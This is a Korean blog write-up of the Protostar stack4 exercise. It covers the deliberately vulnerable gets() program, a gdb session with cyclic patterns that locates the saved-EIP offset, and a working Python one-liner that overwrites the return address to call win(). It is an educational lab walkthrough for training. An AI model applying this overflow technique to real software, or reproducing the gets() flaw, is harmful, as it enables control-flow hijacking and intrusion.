---
layout: post
title: "[exploit-exercise] Protostar stack4"
date: 2016-07-03 13:00:00
category: wargame
tags:  [exploit-exercise, protostar]
---

[Protostar Stack4 - Exploit Exercises](https://exploit-exercises.com/protostar/stack4/)

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
>
>This level is at /opt/protostar/bin/stack4
>
>Hints
>
>A variety of introductory papers into buffer overflows may help.
>gdb lets you do “run < input”
>EIP is not directly after the end of buffer, compiler padding can also >increase the size.

<!--more--> 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### 해결 방안

>A variety of introductory papers into buffer overflows may help.

BoF 에 대한 많은 입문 글들이 도움이 될 것이다. 즉, 그런 글을 먼저 읽어보라는 이야기겠죠. 

이전 문제와 다른 점은 crash 할 수 있는 다른 변수가 없다는 것이다. 따라서 stack 에 저장된 `lr` 을 덮으면 될 듯... `buffer[64]` 뒤에 `lr` 이 어디에 저장이 되어 있는지를 정확하게 하기 위하여 정해진 pattern 으로 stack crash 시킨 다음에 `eip` 를 확인해보자.

정해진 pattern create 해주는 기능이 많이 있지만 일반적으로 쓸 수 있도록 아래 python script 를 이용해보자.

[Svenito/exploit-pattern: generate and search pattern string for exploit development](https://github.com/Svenito/exploit-pattern)

```bash
$ pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

#### 분석

```bash
$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 | ./stack4
Segmentation fault  
```

BoF 가 터졌다~~~
gdb 를 붙여서 좀더 자세하게 확인해보자.

```bash
$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 > /tmp/input
$ gdb ./stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) r < /tmp/input
Starting program: /opt/protostar/bin/stack4 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()  
```

처음에는 pattern 에서 찾아서 위치를 확인했었는데, pattern script 에서 값을 넣어주면 위치까지 저절로 찾아준다. :)

```bash
$ pattern.py 0x63413563
Pattern 0x63413563 first occurrence at position 76 in pattern.
```

BoF 로 `eip` 설정할 값은 `win()` 이므로 주소 확인.

```
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   %ebp
0x080483f5 <win+1>:     mov    %esp,%ebp
0x080483f7 <win+3>:     sub    $0x18,%esp
0x080483fa <win+6>:     movl   $0x80484e0,(%esp)
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret  
```

#### Exploit 

```bash
$ python -c 'print "A"*76 + "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault  
```

그런데, `lr` 이 4 bytes align 이 맞지 않게 `76` bytes 뒤에 잡히나 했는데... `76` 이 `4` 의 배수였군요... 역시나 `4` alignment 맞는다.